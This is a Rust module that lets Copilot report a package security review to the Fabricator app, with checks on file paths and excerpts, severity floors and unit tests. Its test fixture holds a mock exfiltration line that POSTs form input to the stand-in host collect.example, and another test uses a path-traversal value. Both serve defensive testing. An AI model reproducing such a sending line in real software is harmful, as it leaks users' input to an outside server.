//! Client-defined tools Copilot reports its security review through. Each
//! report is checked before it streams to the window: the area must be one the
//! check covers, the file must be in the package, and the quoted lines must be
//! in that file (Copilot is asked once to quote them again). Copilot assesses
//! Fabricator's own findings but can't rate one below its floor, and its
//! verdict can only make the check's stricter, never take a finding away.

use std::collections::{BTreeMap, HashMap};
use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use async_trait::async_trait;
use github_copilot_sdk::tool::ToolHandler;
use github_copilot_sdk::types::{ToolInvocation, ToolResultExpanded};
use github_copilot_sdk::{Error as SdkError, Tool, ToolResult};
use serde::Deserialize;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};

use super::checks::Signal;
use super::{clip_lines, rank};
use crate::commands::advisor::evidence;
use crate::types::{SecurityAreaResult, SecurityEvent, SecurityFinding};

pub(super) const FINDING_TOOL: &str = "fabricator_security_finding";
pub(super) const ASSESS_TOOL: &str = "fabricator_security_assess";
pub(super) const AREA_TOOL: &str = "fabricator_security_area";
pub(super) const COMPLETE_TOOL: &str = "fabricator_security_complete";

const MAX_TITLE: usize = 120;
const MAX_TEXT: usize = 900;
const MAX_ASSESSMENT: usize = 600;
const MAX_SUMMARY: usize = 360;
const MAX_NOTE: usize = 200;
const MAX_PLACES: usize = 10;
const SEVERITIES: [&str; 4] = ["high", "medium", "low", "note"];
const VERDICTS: [&str; 3] = ["clear", "caution", "danger"];
const STATUSES: [&str; 3] = ["clear", "flagged", "skipped"];

/// The check's own reporting tools, which the activity feed leaves out.
pub(super) fn is_reporting_tool(name: &str) -> bool {
  name.starts_with("fabricator_security_")
}

fn clip(text: &str, max: usize) -> String {
  let t = text.trim();
  if t.chars().count() <= max {
    return t.to_string();
  }
  let cut: String = t.chars().take(max.saturating_sub(1)).collect();
  format!("{}…", cut.trim_end())
}

fn severity_of(value: &str) -> Option<&'static str> {
  match value.trim().to_ascii_lowercase().as_str() {
    "high" | "critical" => Some("high"),
    "medium" | "moderate" => Some("medium"),
    "low" => Some("low"),
    "note" | "info" => Some("note"),
    _ => None,
  }
}

/// `clear`, `caution` or `danger`: what the worst finding makes it, or
/// stricter when Copilot's own verdict (`said`) is.
pub(super) fn verdict(findings: &[SecurityFinding], said: Option<&str>) -> &'static str {
  let worst = findings.iter().map(|f| rank(&f.severity)).max().unwrap_or(0);
  let found = match worst {
    3 => 2,
    2 => 1,
    _ => 0,
  };
  let said = said.and_then(|s| VERDICTS.iter().position(|v| *v == s)).unwrap_or(0);
  VERDICTS[found.max(said)]
}

/// Everything the review has reported, with Fabricator's own findings.
#[derive(Default)]
pub(super) struct CheckLog {
  pub findings: Vec<SecurityFinding>,
  /// The lowest severity each of Fabricator's findings may have.
  floors: HashMap<String, &'static str>,
  /// Each area's outcome, as Copilot (or the files themselves) told it.
  areas: BTreeMap<String, SecurityAreaResult>,
  pub summary: Option<String>,
  pub verdict: Option<&'static str>,
  /// Copilot called the completing tool.
  pub completed: bool,
  /// Copilot reported anything at all through the tools.
  pub reported: bool,
  /// Unmatched excerpt attempts per finding.
  excerpt_misses: HashMap<String, u32>,
}

impl CheckLog {
  /// A log that starts with Fabricator's findings, and the areas its checks found clear.
  pub fn new(signals: &[Signal], clear: &[(&str, String)]) -> Self {
    let mut log = CheckLog::default();
    for signal in signals {
      log.floors.insert(signal.finding.id.clone(), signal.floor);
      log.findings.push(signal.finding.clone());
    }
    for (area, note) in clear {
      let result = SecurityAreaResult { area: area.to_string(), status: "clear".into(), note: Some(note.clone()) };
      log.areas.insert(area.to_string(), result);
    }
    log
  }

  /// Ids of Fabricator's own findings, for Copilot to assess.
  pub fn fabricator_ids(&self) -> Vec<String> {
    let mut ids: Vec<String> = self.floors.keys().cloned().collect();
    ids.sort();
    ids
  }

  /// Each of `areas`' outcome: flagged when a finding in it is worth knowing
  /// (low or worse), else what Copilot or the files said. Once the check is
  /// `finished`, an area nothing was said about is `skipped`; until then it's left out.
  pub fn area_results(&self, areas: &[&str], finished: bool) -> Vec<SecurityAreaResult> {
    areas
      .iter()
      .filter_map(|area| {
        let said = self.areas.get(*area);
        if self.findings.iter().any(|f| f.area == *area && rank(&f.severity) >= 1) {
          let note = said.filter(|r| r.status == "flagged").and_then(|r| r.note.clone());
          return Some(SecurityAreaResult { area: area.to_string(), status: "flagged".into(), note });
        }
        match said {
          Some(result) => Some(result.clone()),
          None if finished => Some(SecurityAreaResult { area: area.to_string(), status: "skipped".into(), note: None }),
          None => None,
        }
      })
      .collect()
  }
}

pub(super) type SharedLog = Arc<Mutex<CheckLog>>;

/// Delivers an event to the window (a closure, so the tools don't need a Tauri handle).
pub(super) type Emit = Arc<dyn Fn(SecurityEvent) + Send + Sync>;

/// What the tools check reports against (no Tauri handle, so it can be unit-tested).
pub(super) struct CheckCore {
  /// The unpacked package.
  pub root: PathBuf,
  pub areas: Vec<&'static str>,
  pub log: SharedLog,
}

pub(super) struct CheckContext {
  pub emit: Emit,
  pub core: CheckCore,
}

impl CheckContext {
  fn emit_areas(&self) {
    let results = self.core.log.lock().unwrap().area_results(&self.core.areas, false);
    (self.emit)(SecurityEvent::Areas { results });
  }
}

/* ------------------------------- findings -------------------------------- */

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct FindingParams {
  area: String,
  severity: String,
  title: String,
  detail: String,
  #[serde(default)]
  advice: String,
  #[serde(default)]
  file: Option<String>,
  #[serde(default)]
  start_line: Option<u32>,
  #[serde(default)]
  end_line: Option<u32>,
  #[serde(default)]
  excerpt: Option<String>,
  #[serde(default)]
  other_places: Vec<String>,
}

/// What happened to a reported finding.
#[derive(Debug, PartialEq, Eq)]
pub(super) enum Recorded {
  New,
  /// The same finding again, with a higher severity or more places.
  Merged,
  Duplicate,
}

/// A `path` or `path:line` in the package, as it exists there.
fn place_in(core: &CheckCore, raw: &str) -> Option<String> {
  let raw = raw.trim();
  let (path, line) = match raw.rsplit_once(':') {
    Some((path, line)) if line.chars().all(|c| c.is_ascii_digit()) && !line.is_empty() => (path, Some(line)),
    _ => (raw, None),
  };
  let rel = evidence::normalize_rel(path, &core.root)?;
  Some(match line {
    Some(line) => format!("{rel}:{line}"),
    None => rel,
  })
}

fn finding_id(area: &str, file: Option<&str>, title: &str) -> String {
  let mut hasher = Sha256::new();
  for part in [area, file.unwrap_or(""), &title.to_lowercase()] {
    hasher.update(part.as_bytes());
    hasher.update(b"\0");
  }
  format!("ai:{}", &hex::encode(hasher.finalize())[..12])
}

/// Check one reported finding and record it. `Err` is the message the model
/// gets back to correct its report.
pub(super) fn record_finding(core: &CheckCore, p: FindingParams) -> Result<(SecurityFinding, Recorded), String> {
  let area = p.area.trim().to_ascii_lowercase();
  let Some(area) = core.areas.iter().find(|a| **a == area) else {
    return Err(format!("Unknown area `{}`. Use one of: {}.", p.area, core.areas.join(", ")));
  };
  let Some(severity) = severity_of(&p.severity) else {
    return Err("severity must be high, medium, low or note.".into());
  };
  let (title, detail, advice) = (clip(&p.title, MAX_TITLE), clip(&p.detail, MAX_TEXT), clip(&p.advice, MAX_TEXT));
  if title.is_empty() || detail.is_empty() {
    return Err("title and detail are both required.".into());
  }

  let mut finding = SecurityFinding {
    area: area.to_string(),
    severity: severity.into(),
    source: "copilot".into(),
    title,
    detail,
    advice,
    ..Default::default()
  };
  if let Some(raw) = p.file.as_deref().filter(|f| !f.trim().is_empty()) {
    let Some(rel) = evidence::normalize_rel(raw, &core.root) else {
      return Err(format!(
        "`{raw}` isn't a file in this package you can read. Report a path relative to the package, such as src/App.tsx."
      ));
    };
    if let Some(content) = evidence::read_text(&core.root, &rel) {
      let quoted = p.excerpt.as_deref().map(str::trim).filter(|e| !e.is_empty());
      let located = quoted.and_then(|q| evidence::locate(&content, q, p.start_line));
      let range = match (located, quoted) {
        (Some(range), _) => Some(range),
        (None, Some(_)) => {
          let key = format!("{area}\u{0}{rel}\u{0}{}", finding.title);
          let misses = {
            let mut log = core.log.lock().unwrap();
            let n = log.excerpt_misses.entry(key).or_insert(0);
            *n += 1;
            *n
          };
          if misses == 1 {
            return Err(format!(
              "That excerpt isn't in {rel}. Read the file again and copy the exact lines (without line numbers), then report the finding again."
            ));
          }
          p.start_line.map(|s| (s, p.end_line.unwrap_or(s).max(s)))
        }
        (None, None) => p.start_line.map(|s| (s, p.end_line.unwrap_or(s).max(s))),
      };
      if let Some((start, end)) = range {
        let total = content.lines().count().max(1) as u32;
        let start = start.clamp(1, total);
        let end = end.clamp(start, total);
        let (text, first) = evidence::window(&content, start, end);
        finding.line = Some(start);
        finding.end_line = (end != start).then_some(end);
        finding.excerpt = Some(clip_lines(&evidence::mask_secrets(&text)));
        finding.excerpt_start = Some(first);
      }
    }
    finding.file = Some(rel);
  }
  for place in p.other_places.iter().filter_map(|raw| place_in(core, raw)) {
    if finding.places.len() < MAX_PLACES && !finding.places.contains(&place) {
      finding.places.push(place);
    }
  }
  finding.id = finding_id(&finding.area, finding.file.as_deref(), &finding.title);

  let mut log = core.log.lock().unwrap();
  log.reported = true;
  if let Some(existing) = log.findings.iter_mut().find(|f| f.id == finding.id) {
    let mut changed = false;
    if rank(&finding.severity) > rank(&existing.severity) {
      existing.severity = finding.severity.clone();
      changed = true;
    }
    for place in finding.places {
      if existing.places.len() < MAX_PLACES && !existing.places.contains(&place) {
        existing.places.push(place);
        changed = true;
      }
    }
    return Ok((existing.clone(), if changed { Recorded::Merged } else { Recorded::Duplicate }));
  }
  log.findings.push(finding.clone());
  Ok((finding, Recorded::New))
}

/* ------------------------------ assessments ------------------------------ */

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct AssessParams {
  finding_id: String,
  severity: String,
  assessment: String,
}

/// Record Copilot's assessment of one of Fabricator's findings: what it found
/// the code does, and a severity no lower than the finding's floor.
pub(super) fn record_assessment(core: &CheckCore, p: AssessParams) -> Result<(SecurityFinding, bool), String> {
  let mut log = core.log.lock().unwrap();
  let id = p.finding_id.trim().to_string();
  let Some(floor) = log.floors.get(&id).copied() else {
    return Err(format!("Unknown findingId `{id}`. Use one of: {}.", log.fabricator_ids().join(", ")));
  };
  let Some(severity) = severity_of(&p.severity) else {
    return Err("severity must be high, medium, low or note.".into());
  };
  let assessment = clip(&p.assessment, MAX_ASSESSMENT);
  if assessment.is_empty() {
    return Err("assessment is required: say what the code it points at actually does.".into());
  }
  let held = rank(severity) < rank(floor);
  let severity = if held { floor } else { severity };
  log.reported = true;
  let finding = log.findings.iter_mut().find(|f| f.id == id).expect("a finding for every floor");
  finding.severity = severity.into();
  finding.assessment = Some(assessment);
  Ok((finding.clone(), held))
}

/* ------------------------------ areas, end ------------------------------- */

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct AreaParam {
  area: String,
  status: String,
  #[serde(default)]
  note: Option<String>,
}

#[derive(Deserialize)]
struct AreasParams {
  #[serde(default)]
  results: Vec<AreaParam>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
pub(super) struct CompleteParams {
  verdict: String,
  #[serde(default)]
  summary: String,
  #[serde(default)]
  areas: Vec<AreaParam>,
}

/// Record areas' outcomes; returns the areas it didn't know.
pub(super) fn record_areas(core: &CheckCore, results: Vec<AreaParam>) -> Vec<String> {
  let mut log = core.log.lock().unwrap();
  let mut unknown = Vec::new();
  for r in results {
    let area = r.area.trim().to_ascii_lowercase();
    let status = r.status.trim().to_ascii_lowercase();
    if !core.areas.contains(&area.as_str()) || !STATUSES.contains(&status.as_str()) {
      unknown.push(r.area);
      continue;
    }
    let note = r.note.map(|n| clip(&n, MAX_NOTE)).filter(|n| !n.is_empty());
    log.reported = true;
    log.areas.insert(area.clone(), SecurityAreaResult { area, status, note });
  }
  unknown
}

/// Record the end of the review: Copilot's verdict, its summary, and any areas left.
pub(super) fn record_completion(core: &CheckCore, p: CompleteParams) -> Result<Option<String>, String> {
  let Some(verdict) = VERDICTS.iter().copied().find(|v| p.verdict.trim().eq_ignore_ascii_case(v)) else {
    return Err("verdict must be clear, caution or danger.".into());
  };
  record_areas(core, p.areas);
  let summary = clip(&p.summary, MAX_SUMMARY);
  let mut log = core.log.lock().unwrap();
  log.reported = true;
  log.completed = true;
  log.verdict = Some(verdict);
  log.summary = Some(summary.clone()).filter(|s| !s.is_empty());
  Ok(log.summary.clone())
}

/* --------------------------------- tools --------------------------------- */

fn ok(text: impl Into<String>) -> ToolResult {
  ToolResult::Expanded(ToolResultExpanded::new(text.into(), "success"))
}

fn fail(text: impl Into<String>) -> ToolResult {
  let text = text.into();
  ToolResult::Expanded(ToolResultExpanded::new(text.clone(), "failure").with_error(text))
}

struct FindingTool(Arc<CheckContext>);
struct AssessTool(Arc<CheckContext>);
struct AreaTool(Arc<CheckContext>);
struct CompleteTool(Arc<CheckContext>);

#[async_trait]
impl ToolHandler for FindingTool {
  async fn call(&self, invocation: ToolInvocation) -> Result<ToolResult, SdkError> {
    let params = match invocation.params::<FindingParams>() {
      Ok(p) => p,
      Err(e) => return Ok(fail(format!("Invalid finding: {e}"))),
    };
    let ctx = &self.0;
    match record_finding(&ctx.core, params) {
      Ok((finding, Recorded::Duplicate)) => Ok(ok(format!("Already recorded as {}. Continue the check.", finding.id))),
      Ok((finding, recorded)) => {
        let reply = match recorded {
          Recorded::New => format!("Recorded {}. Continue the check.", finding.id),
          _ => format!("Added this to {}, which you reported before. Continue the check.", finding.id),
        };
        (ctx.emit)(SecurityEvent::Finding { finding });
        ctx.emit_areas();
        Ok(ok(reply))
      }
      Err(message) => Ok(fail(message)),
    }
  }
}

#[async_trait]
impl ToolHandler for AssessTool {
  async fn call(&self, invocation: ToolInvocation) -> Result<ToolResult, SdkError> {
    let params = match invocation.params::<AssessParams>() {
      Ok(p) => p,
      Err(e) => return Ok(fail(format!("Invalid assessment: {e}"))),
    };
    let ctx = &self.0;
    match record_assessment(&ctx.core, params) {
      Ok((finding, held)) => {
        let reply = if held {
          format!("Recorded. Fabricator keeps {} at {} at least. Continue the check.", finding.id, finding.severity)
        } else {
          format!("Recorded your assessment of {}. Continue the check.", finding.id)
        };
        (ctx.emit)(SecurityEvent::Finding { finding });
        ctx.emit_areas();
        Ok(ok(reply))
      }
      Err(message) => Ok(fail(message)),
    }
  }
}

#[async_trait]
impl ToolHandler for AreaTool {
  async fn call(&self, invocation: ToolInvocation) -> Result<ToolResult, SdkError> {
    let params = match invocation.params::<AreasParams>() {
      Ok(p) => p,
      Err(e) => return Ok(fail(format!("Invalid area report: {e}"))),
    };
    let ctx = &self.0;
    let unknown = record_areas(&ctx.core, params.results);
    ctx.emit_areas();
    if unknown.is_empty() {
      Ok(ok("Recorded. Continue the check."))
    } else {
      Ok(ok(format!("Recorded the rest. Ignored unknown areas or statuses: {}.", unknown.join(", "))))
    }
  }
}

#[async_trait]
impl ToolHandler for CompleteTool {
  async fn call(&self, invocation: ToolInvocation) -> Result<ToolResult, SdkError> {
    let params = match invocation.params::<CompleteParams>() {
      Ok(p) => p,
      Err(e) => return Ok(fail(format!("Invalid completion: {e}"))),
    };
    let ctx = &self.0;
    match record_completion(&ctx.core, params) {
      Ok(summary) => {
        if let Some(text) = summary {
          (ctx.emit)(SecurityEvent::Summary { text });
        }
        ctx.emit_areas();
        Ok(ok("Check recorded. Reply with one short sentence and stop."))
      }
      Err(message) => Ok(fail(message)),
    }
  }
}

fn area_results_schema(areas: &[&str]) -> Value {
  json!({
    "type": "array",
    "items": {
      "type": "object",
      "additionalProperties": false,
      "properties": {
        "area": { "type": "string", "enum": areas },
        "status": { "type": "string", "enum": STATUSES },
        "note": { "type": "string", "description": "A short reason. Required for skipped." }
      },
      "required": ["area", "status"]
    }
  })
}

/// The tools Copilot reports one check through.
pub(super) fn check_tools(ctx: Arc<CheckContext>) -> Vec<Tool> {
  let areas = ctx.core.areas.clone();
  let fabricator_ids = ctx.core.log.lock().unwrap().fabricator_ids();
  let finding = Tool::new(FINDING_TOOL)
    .with_description(
      "Report ONE security risk you confirmed by reading the package's code, as soon as you confirm it. The host \
       checks the excerpt against the file, so copy the exact lines.",
    )
    .with_parameters(json!({
      "type": "object",
      "additionalProperties": false,
      "properties": {
        "area": { "type": "string", "enum": areas },
        "severity": {
          "type": "string",
          "enum": SEVERITIES,
          "description": "high: harms the user's computer, accounts or data once they go ahead, with nothing more from them. medium: risky, worth a look first. low: worth knowing. note: context."
        },
        "title": { "type": "string", "description": "What it does, in plain words, at most 10 words. E.g. 'Sends what you type to an unknown server'." },
        "detail": { "type": "string", "description": "What the code does and why it matters to the person, in 1-3 plain sentences. Name the hosts, files and commands." },
        "advice": { "type": "string", "description": "What the person should do about it, in one sentence." },
        "file": { "type": "string", "description": "Path in the package, e.g. packages/functions/src/send.ts." },
        "startLine": { "type": "integer", "minimum": 1 },
        "endLine": { "type": "integer", "minimum": 1 },
        "excerpt": { "type": "string", "description": "1-12 lines copied exactly from the file, without line numbers. Mask secret values." },
        "otherPlaces": {
          "type": "array",
          "maxItems": MAX_PLACES,
          "items": { "type": "string" },
          "description": "Other places it happens, as path or path:line."
        }
      },
      "required": ["area", "severity", "title", "detail", "advice", "file", "excerpt"]
    }))
    .with_skip_permission(true)
    .with_handler(Arc::new(FindingTool(ctx.clone())));
  let area = Tool::new(AREA_TOOL)
    .with_description(
      "When you finish an area, report its outcome: clear (nothing risky), flagged (you reported a finding in it) \
       or skipped (you couldn't check it, with a note).",
    )
    .with_parameters(json!({
      "type": "object",
      "additionalProperties": false,
      "properties": { "results": area_results_schema(&areas) },
      "required": ["results"]
    }))
    .with_skip_permission(true)
    .with_handler(Arc::new(AreaTool(ctx.clone())));
  let complete = Tool::new(COMPLETE_TOOL)
    .with_description(
      "Finish the check, last: your verdict, a plain summary for the person deciding whether to go ahead, and the \
       outcome of every area you haven't reported.",
    )
    .with_parameters(json!({
      "type": "object",
      "additionalProperties": false,
      "properties": {
        "verdict": {
          "type": "string",
          "enum": VERDICTS,
          "description": "clear: nothing risky. caution: worth a look before going ahead. danger: don't go ahead without knowing why it does this."
        },
        "summary": { "type": "string", "description": "One or two short sentences, under 40 words, saying what the package does that matters." },
        "areas": area_results_schema(&areas)
      },
      "required": ["verdict", "summary"]
    }))
    .with_skip_permission(true)
    .with_handler(Arc::new(CompleteTool(ctx.clone())));
  let mut tools = vec![finding, area, complete];
  if !fabricator_ids.is_empty() {
    let assess = Tool::new(ASSESS_TOOL)
      .with_description(
        "Give your assessment of one of Fabricator's own findings after reading the code it points at: what it \
         actually does, and how risky that is. Fabricator keeps a lowest severity for each.",
      )
      .with_parameters(json!({
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "findingId": { "type": "string", "enum": fabricator_ids },
          "severity": { "type": "string", "enum": SEVERITIES },
          "assessment": { "type": "string", "description": "What the code it points at actually does, in 1-2 plain sentences." }
        },
        "required": ["findingId", "severity", "assessment"]
      }))
      .with_skip_permission(true)
      .with_handler(Arc::new(AssessTool(ctx)));
    tools.insert(1, assess);
  }
  tools
}

#[cfg(test)]
mod tests {
  use super::*;

  struct Package {
    core: CheckCore,
  }

  impl Package {
    fn new(signals: &[Signal]) -> Self {
      let root = std::env::temp_dir().join(format!("fabricator-check-tools-{}", uuid::Uuid::new_v4()));
      std::fs::create_dir_all(root.join("src")).unwrap();
      std::fs::write(
        root.join("src").join("send.ts"),
        "import { form } from './form'\n\nexport async function send(body: string) {\n  await fetch('https://collect.example/x', { method: 'POST', body })\n  const apiKey = 'sk-abcdefghijklmnop'\n}\n",
      )
      .unwrap();
      let log = Arc::new(Mutex::new(CheckLog::new(signals, &[("install", "No install scripts.".to_string())])));
      Package { core: CheckCore { root, areas: vec!["install", "packages", "network", "hidden", "system"], log } }
    }
  }

  impl Drop for Package {
    fn drop(&mut self) {
      let _ = std::fs::remove_dir_all(&self.core.root);
    }
  }

  fn params(value: Value) -> FindingParams {
    serde_json::from_value(value).unwrap()
  }

  fn sending(excerpt: &str) -> FindingParams {
    params(json!({
      "area": "network",
      "severity": "high",
      "title": "Sends what you type to an unknown server",
      "detail": "It posts every form to collect.example.",
      "advice": "Don't install it.",
      "file": "./src/send.ts",
      "startLine": 4,
      "excerpt": excerpt,
      "otherPlaces": ["src/send.ts:5", "src/missing.ts:1", "src/send.ts:5"]
    }))
  }

  fn signal(id: &str, area: &str, severity: &str, floor: &'static str) -> Signal {
    Signal {
      finding: SecurityFinding {
        id: id.into(),
        area: area.into(),
        severity: severity.into(),
        source: "fabricator".into(),
        title: "x".into(),
        ..Default::default()
      },
      floor,
    }
  }

  #[test]
  fn a_finding_is_checked_against_the_file_and_quoted_from_it() {
    let pkg = Package::new(&[]);
    let (finding, recorded) =
      record_finding(&pkg.core, sending("await fetch('https://collect.example/x', { method: 'POST', body })")).unwrap();
    assert_eq!(recorded, Recorded::New);
    assert_eq!((finding.file.as_deref(), finding.line, finding.excerpt_start), (Some("src/send.ts"), Some(4), Some(2)));
    assert_eq!(finding.source, "copilot");
    assert!(finding.id.starts_with("ai:"));
    let excerpt = finding.excerpt.unwrap();
    assert!(excerpt.contains("collect.example") && !excerpt.contains("sk-abcdefghijklmnop"), "{excerpt}");
    assert_eq!(finding.places, ["src/send.ts:5"], "places that aren't in the package are dropped");

    let (_, again) = record_finding(&pkg.core, sending("await fetch('https://collect.example/x'")).unwrap();
    assert_eq!(again, Recorded::Duplicate);
  }

  #[test]
  fn a_misquoted_excerpt_is_sent_back_once_then_kept_by_its_line() {
    let pkg = Package::new(&[]);
    let error = record_finding(&pkg.core, sending("await post(everything)")).unwrap_err();
    assert!(error.contains("isn't in src/send.ts"), "{error}");
    let (finding, _) = record_finding(&pkg.core, sending("await post(everything)")).unwrap();
    assert_eq!(finding.line, Some(4));
  }

  #[test]
  fn reports_outside_the_package_or_its_areas_are_refused() {
    let pkg = Package::new(&[]);
    let mut outside = sending("x");
    outside.file = Some("../../secrets.txt".into());
    assert!(record_finding(&pkg.core, outside).unwrap_err().contains("isn't a file in this package"));
    let mut agents = sending("x");
    agents.area = "agents".into();
    assert!(record_finding(&pkg.core, agents).unwrap_err().starts_with("Unknown area `agents`"));
    assert!(!pkg.core.log.lock().unwrap().reported);
  }

  #[test]
  fn an_assessment_cant_take_a_finding_below_its_floor() {
    let pkg = Package::new(&[signal("check:git-settings", "system", "high", "medium"), signal("check:programs", "system", "medium", "low")]);
    let assess = |id: &str, severity: &str| {
      record_assessment(&pkg.core, AssessParams { finding_id: id.into(), severity: severity.into(), assessment: "It runs a watcher.".into() })
    };
    let (finding, held) = assess("check:git-settings", "low").unwrap();
    assert_eq!((finding.severity.as_str(), held), ("medium", true));
    assert_eq!(finding.assessment.as_deref(), Some("It runs a watcher."));
    let (finding, held) = assess("check:programs", "low").unwrap();
    assert_eq!((finding.severity.as_str(), held), ("low", false));
    assert_eq!(assess("check:programs", "high").unwrap().0.severity, "high", "it can always be raised");
    assert!(assess("ai:123", "low").unwrap_err().starts_with("Unknown findingId"));
  }

  #[test]
  fn the_verdict_follows_the_worst_finding_and_copilot_can_only_raise_it() {
    let with = |severities: &[&str]| -> Vec<SecurityFinding> {
      severities.iter().map(|s| SecurityFinding { severity: s.to_string(), ..Default::default() }).collect()
    };
    assert_eq!(verdict(&with(&[]), None), "clear");
    assert_eq!(verdict(&with(&["low", "note"]), Some("clear")), "clear");
    assert_eq!(verdict(&with(&["medium", "low"]), Some("clear")), "caution");
    assert_eq!(verdict(&with(&["high"]), Some("clear")), "danger");
    assert_eq!(verdict(&with(&["low"]), Some("danger")), "danger");
    assert_eq!(verdict(&with(&[]), Some("nonsense")), "clear");
  }

  #[test]
  fn areas_come_out_flagged_clear_or_skipped() {
    let pkg = Package::new(&[signal("check:programs", "system", "medium", "low"), signal("check:x", "hidden", "note", "note")]);
    let unknown = record_areas(
      &pkg.core,
      vec![
        AreaParam { area: "network".into(), status: "flagged".into(), note: Some("Calls collect.example.".into()) },
        AreaParam { area: "system".into(), status: "clear".into(), note: None },
        AreaParam { area: "agents".into(), status: "clear".into(), note: None },
      ],
    );
    assert_eq!(unknown, ["agents"], "an app's check has no agents area");
    let log = pkg.core.log.lock().unwrap();
    let statuses = |finished: bool| -> Vec<(String, String)> {
      log.area_results(&pkg.core.areas, finished).into_iter().map(|r| (r.area, r.status)).collect()
    };
    let pairs = |items: &[(&str, &str)]| -> Vec<(String, String)> {
      items.iter().map(|(a, s)| (a.to_string(), s.to_string())).collect()
    };
    // A note isn't worth flagging an area for, and one Copilot flagged stays flagged.
    assert_eq!(statuses(false), pairs(&[("install", "clear"), ("network", "flagged"), ("system", "flagged")]));
    assert_eq!(
      statuses(true),
      pairs(&[("install", "clear"), ("packages", "skipped"), ("network", "flagged"), ("hidden", "skipped"), ("system", "flagged")])
    );
  }

  #[test]
  fn completing_records_the_verdict_and_summary() {
    let pkg = Package::new(&[]);
    let done = |verdict: &str| {
      record_completion(&pkg.core, CompleteParams { verdict: verdict.into(), summary: "  It's an expense tracker.  ".into(), areas: vec![] })
    };
    assert!(done("fine").is_err());
    assert_eq!(done("Caution").unwrap().as_deref(), Some("It's an expense tracker."));
    let log = pkg.core.log.lock().unwrap();
    assert!(log.completed && log.reported);
    assert_eq!(log.verdict, Some("caution"));
  }
}
